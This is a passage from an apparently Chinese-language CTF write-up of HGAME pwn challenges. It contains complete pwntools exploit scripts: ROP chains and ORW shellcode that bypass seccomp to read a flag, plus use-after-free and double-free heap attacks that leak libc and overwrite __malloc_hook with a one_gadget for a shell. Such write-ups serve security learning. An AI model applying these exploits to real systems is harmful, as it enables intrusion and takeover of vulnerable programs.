src="https://pic.imgdb.cn/item/63bd0a8bbe43e0d30e4c5e16.png"></a></em></p><p><em>rdi满足条件 rdx为0x130 如果我们往bss段写入rop链的话 rdx也不用修改 那么只需要修改rsi就可以了</em></p><p><em>ROPgadget获取libc文件的pop rsi偏移 再加上libc基址获得pop rsi指令的地址</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p><em>这里注意一下bss_addr 要和bss段的起始位置间隔一段距离 因为bss段比较靠近got表 可能会导致栈空间延申到got表 导致read失败 也是老生常谈的问题了</em></p><p><em>那么接下里的难点就是构造rop链了 下面每行各自对应open write puts 应该是浅显易懂的</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(puts_addr)</span><br></pre></td></tr></table></figure><p><em>完整exp:</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)</span></span><br><span class="line">rdi_addr = <span class="number">0x401393</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x401391</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x401070</span></span><br><span class="line">main_addr = <span class="number">0x4012f0</span></span><br><span class="line">read_plt = <span class="number">0x401080</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_addr = <span class="number">0x404090</span>+<span class="number">0x50</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2601f</span></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x142c92</span></span><br><span class="line">puts_addr = libc_addr + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">leave_addr = <span class="number">0x4012be</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x100</span>)+p64(bss_addr)+p64(leave_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a><em>simple_shellcode</em></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><em>保护全开 ida看一下main函数</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x10</span>uLL);</span><br><span class="line">  sandbox();</span><br><span class="line">  MEMORY[<span class="number">0xCAFE0000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>mmap将0xcafe0000~0xcafe1000这块区域的权限设置为了可读可写可执行 并且程序的最后还调用了这块区域</em></p><p><em>明摆着是将shellcode写入到这块区域 同时给了一次写入的机会 但是只有10字节</em></p><p><em>但是这次又有sandbox函数 看一下是禁用了哪些函数</em></p><p><em><a href="https://pic.imgdb.cn/item/63bd0e3dbe43e0d30e547a78.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd0e3dbe43e0d30e547a78.png"></a></em></p><p><em>还是通过orw来读取flag吧  但是这次是采用shellcode的方式 首当其冲要解决的问题就是写入字节不够的问题</em></p><p><em>这0x10字节的长度虽然不够我们写orw 但是可以供我们调用read函数</em></p><p><em>但是如果我们想要全部参数都修改一次 也是会超出16字节的 所以还是和上题一样 动态调试看一下传完shellcode后各寄存器的默认值</em></p><p><em><a href="https://pic.imgdb.cn/item/63bd33a3be43e0d30ea62dad.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd33a3be43e0d30ea62dad.png"></a></em></p><p><em>我们只需要修改rsi rdi即可 rax为read的系统调用号0 不需要修改</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esi ,0xcafe0500</span></span><br><span class="line"><span class="string">xor edi ,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><em>这里注意一下地址 和bss段同理 栈有可能会溢出到其他不可执行的区域 所以需要抬高一点栈帧空间</em></p><p><em>随后就是orw的汇编:</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push (2)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov r10d, 0x7fffffff</span></span><br><span class="line"><span class="string">mov rsi, rax</span></span><br><span class="line"><span class="string">push (40)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><em>完整exp:</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31897</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esi ,0xcafe0500</span></span><br><span class="line"><span class="string">xor edi ,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(asm(shellcode))</span><br><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push (2)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov r10d, 0x7fffffff</span></span><br><span class="line"><span class="string">mov rsi, rax</span></span><br><span class="line"><span class="string">push (40)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">io.sendline(asm(shellcode))</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a><em>fast_note</em></h3><p><em>一道很常规的double free题 不过在最后修改malloc_hook的时候有点特殊 也算有学到新知识</em></p><p><em>这题是libc 2.23版本</em> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] &#x27;/home/chen/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show_note(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>没有edit函数 add函数的content输入没有堆溢出的机会 看一看delete函数</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;notes)[v1] )</span><br><span class="line">      <span class="built_in">free</span>((&amp;notes)[v1]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>堆块释放以后 没有对存放堆块的指针置零 存在UAF漏洞 再加上有show函数 那么泄露libc基址我们可以很轻松的通过unsortedbin来做到</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31198</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena - <span class="number">88</span> - <span class="number">0x3C4B20</span></span><br></pre></td></tr></table></figure><p><em>应该是很好理解 fastbin的范围只有0x20~0x80 那么我们释放一个0x80大小的chunk就会被放入unsortedbin 这时候其fd和bk域就会指向main_arena_addr 而delete函数没有对这个chunk的指针置零  导致这个我们仍然可以使用这个指针对chunk进行操作</em></p><p><em>还有一点就是libc基址的计算办法 88这个gdb动调可以很明显的看出来 那这个0x3c4b20呢 以往我们用的是gdb动调看libc基址和当此程序运行时泄露的main_arean的偏移 但是有的时候题目远程靶机和本地的libc版本不一样 这个时候如果你不会用patchelf修改libc的话 可以通过ida打开题目所对应的libc文件</em></p><p><em>寻找malloc_trim函数</em> </p><p><em><a href="https://pic.imgdb.cn/item/63c4e7cfbe43e0d30e6b7793.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63c4e7cfbe43e0d30e6b7793.png"></a></em></p><p><em>对应的这个dword_1ecb80的偏移就是main_arean相较于libc基址的偏移</em></p><p><em>接下来的任务是想办法获取shell 2.23的题目直接打malloc_hook就好了 如果没有开启FULL RELRO 的话还可以通过覆写got表来实现shell</em></p><p><em>这里我们采用打got表 用的是double free的办法</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf03a4</span></span><br><span class="line">payload = cyclic(<span class="number">0x13</span>)+p64(one_gadget)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,payload)</span><br></pre></td></tr></table></figure><p><em>但是不管我们如果更换one_gadget的偏移 就是打不通 哪怕gdb动调已经可以看到malloc_hook已经被写入one_gadget了</em></p><p><em>这是因为one_gadget的调用条件不满足</em></p><p><em>那么常规的利用malloc函数触发malloc_hook肯定是不行的了 询问了其他师傅才知道 double free也能触发malloc_hook 为此也是十分好奇 去翻了翻double free的源码</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">       add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">    *fb = p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><em>当glibc检测到double free行为发生后 会调用malloc_printerr用来打印错误日志 但是基于本人水平也就只能朔源到这里了 以下均是猜想</em></p><p><em>因为malloc_printerr是在malloc.c中定义的 所以调用malloc_printerr就会和malloc函数一样先对malloc_hook的内容进行if判断 如果不为0则执行</em></p><p><em>完整exp:</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31198</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena - <span class="number">88</span> - <span class="number">0x3C4B20</span></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf03a4</span></span><br><span class="line">payload = cyclic(<span class="number">0x13</span>)+p64(one_gadget)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a><em>new_fast_note</em></h3><p><em>这题的主体结构和上题一致 不过版本从2.23到了2.31 这给我们的unsortedbin泄露机制和double free都制造了困难</em></p><p><em>由于多出了tcachebin 所以我们想要让一个chunk进入unsortedbin 要么就申请超出tcachebin范围 即0x400以上大小的chunk</em></p><p><em>或者填满tcachebin的一个链表 然后再次释放 如果超出fastbin的范围就会被放入unsortedbin 这里采取第二种办法</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">32435</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena-<span class="number">96</span>-<span 